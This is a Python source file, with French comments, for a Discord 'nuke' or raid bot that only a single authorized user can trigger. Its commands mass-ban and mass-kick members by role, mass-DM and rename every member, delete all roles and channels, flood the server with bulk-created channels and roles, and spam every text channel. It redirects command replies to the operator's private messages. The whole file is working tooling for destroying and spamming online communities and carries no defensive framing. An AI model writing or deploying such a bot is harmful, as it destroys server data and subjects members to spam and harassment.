import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Connecté en tant que {bot.user.name}')

# Ajoutez l'user id autorisé ici
AUTHORIZED_USER_ID = votre user id

def is_authorized(ctx):
    return ctx.author.id == AUTHORIZED_USER_ID

def authorized_only():
    async def predicate(ctx):
        if not is_authorized(ctx):
            print("L'utilisateur n'est pas autorisé. Veuillez mettre votre ID utilisateur dans le code ou consultez le README pour plus d'informations.")
            raise commands.CheckFailure("Authorization check failed")
        return True
    return commands.check(predicate)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        pass
    else:
        print(f"Une erreur s'est produite : {type(error).__name__}: {error}")

@bot.event
async def on_command(ctx):
    original_send = ctx.send
    async def send_to_author(message, *args, **kwargs):
        await ctx.author.send(message, *args, **kwargs)
    ctx.send = send_to_author

@bot.command()
@authorized_only()
async def banrole(ctx, role_name):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role is None:
        await ctx.send(f"Le rôle '{role_name}' n'existe pas sur ce serveur.")
        return

    banned_members_count = 0

    for member in ctx.guild.members:
        if role in member.roles:
            try:
                await member.ban(reason="Banni en raison du rôle spécifié")
                banned_members_count += 1
            except discord.Forbidden:
                print(f"Impossible de bannir {member.name}#{member.discriminator} (ID: {member.id})")
                continue

    await ctx.send(f"Les membres ayant le rôle '{role_name}' ont été bannis avec succès. Total de {banned_members_count} membres bannis.")




@bot.command()
@authorized_only()
async def kickrole(ctx, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if role is None:
            await ctx.send(f"Le rôle '{role_name}' n'existe pas sur ce serveur.")
            return

        expelled_members = 0
        total_members = 0

        for member in ctx.guild.members:
            if role in member.roles:
                total_members += 1
                try:
                    await member.kick(reason=f"Kick en raison du rôle spécifié '{role_name}'")
                    expelled_members += 1
                except discord.Forbidden:
                    print(f"Impossible d'expulser {member.name}#{member.discriminator} (ID: {member.id}) - Autorisation manquante")
                    continue 

        await ctx.send(f"{expelled_members} membres expulsés sur {total_members} pour le rôle '{role_name}'.")

    except commands.MissingPermissions:
        await ctx.send("Le bot ne dispose pas des autorisations nécessaires pour expulser des membres.")
    
    
@bot.command()
@authorized_only()
async def sendmessage(ctx, *, message_content):
    successful_messages = 0
    total_members = 0

    for member in ctx.guild.members:
        try:
            if member == bot.user:
                continue 
            if member.dm_channel is None:
                await member.create_dm()
            await member.dm_channel.send(message_content)
            successful_messages += 1
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator} (ID: {member.id}): Autorisation refusée")
        except discord.HTTPException as e:
            if e.status == 400 and e.code == 50007:
                print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator} (ID: {member.id}): Messages privés désactivés")
            else:
                print(f"Erreur inattendue lors de l'envoi d'un message à {member.name}#{member.discriminator} (ID: {member.id}): {e}")
        finally:
            total_members += 1

    recap_message = f"Message envoyé à {successful_messages} membres sur {total_members} du serveur : \"{message_content}\""
    await ctx.author.send(recap_message)

    
    
@bot.command()
@authorized_only()
async def changenick(ctx, *, new_nick):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=new_nick)
        except Exception as e:
            print(f"Impossible de changer le pseudo de {member.name}#{member.discriminator} (ID: {member.id}): {e}")

    await ctx.send(f"Le pseudo de tous les membres a été changé en : \"{new_nick}\"")
    
    
@bot.command()
@authorized_only()
async def deleteroles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except discord.Forbidden:
            print(f"Impossible de supprimer le role {role.name} (ID: {role.id}) : Permission refusée")
        except discord.HTTPException as e:
            if e.status == 400 and e.code == 50028:
                print(f"Impossible de supprimer le role {role.name} (ID: {role.id}) : Role invalide")
            else:
                print(f"Erreur inattendue lors de la suppression du role {role.name} (ID: {role.id}): {e}")

    await ctx.send("Tous les rôles du serveur ont été supprimés.")
    
    
@bot.command()
@authorized_only()
async def deletesalons(ctx):
    for channel in ctx.guild.channels:
        try:
            if not channel.guild.system_channel or channel.id != channel.guild.system_channel.id:
                await channel.delete()
        except discord.Forbidden:
            print(f"Impossible de supprimer le salon {channel.name} (ID: {channel.id}) : Permission refusée")
        except discord.HTTPException as e:
            if e.status == 400 and e.code == 50074:
                print(f"Impossible de supprimer le salon {channel.name} (ID: {channel.id}) : Salon requis pour les serveurs communautaires")
            else:
                print(f"Erreur inattendue lors de la suppression du salon {channel.name} (ID: {channel.id}): {e}")

    await ctx.send("Tous les salons du serveur ont été supprimés.")


@bot.command()
@authorized_only()
async def createsalons(ctx, nom_salon, nombre_salons=100): # nombre de salon créer 
    for i in range(nombre_salons):
        nom_salon_complet = f"{nom_salon}_{i + 1}"
        try:
            await ctx.guild.create_text_channel(nom_salon_complet)
        except discord.Forbidden:
            print(f"Impossible de créer le salon {nom_salon_complet}")
            continue 

    await ctx.send(f"{nombre_salons} salons textuels avec le nom '{nom_salon}' ont été créés.")


@bot.command()
@authorized_only()
async def createroles(ctx, nom_role, nombre_roles=50): # nombre de role créer
    for i in range(nombre_roles):
        nom_role_complet = f"{nom_role}_{i + 1}"
        try:
            await ctx.guild.create_role(name=nom_role_complet)
        except discord.Forbidden:
            print(f"Impossible de créer le rôle {nom_role_complet}")
            continue  

    await ctx.send(f"{nombre_roles} rôles avec le nom '{nom_role}' ont été créés.")


@bot.command()
@authorized_only()
async def message(ctx, nombre_fois: int, *, message_content):
    tasks = []
    
    for channel in ctx.guild.text_channels:
        tasks.append(send_message(channel, nombre_fois, message_content))

    await asyncio.gather(*tasks)

    await ctx.send(f"Message envoyé {nombre_fois} fois dans tous les salons textuels du serveur : \"{message_content}\"")

async def send_message(channel, nombre_fois, message_content):
    try:
        for _ in range(nombre_fois):
            await channel.send(message_content)
    except discord.Forbidden:
        print(f"Impossible d'envoyer le message dans le salon {channel.name} (ID: {channel.id})")


bot.run('votre token bot')
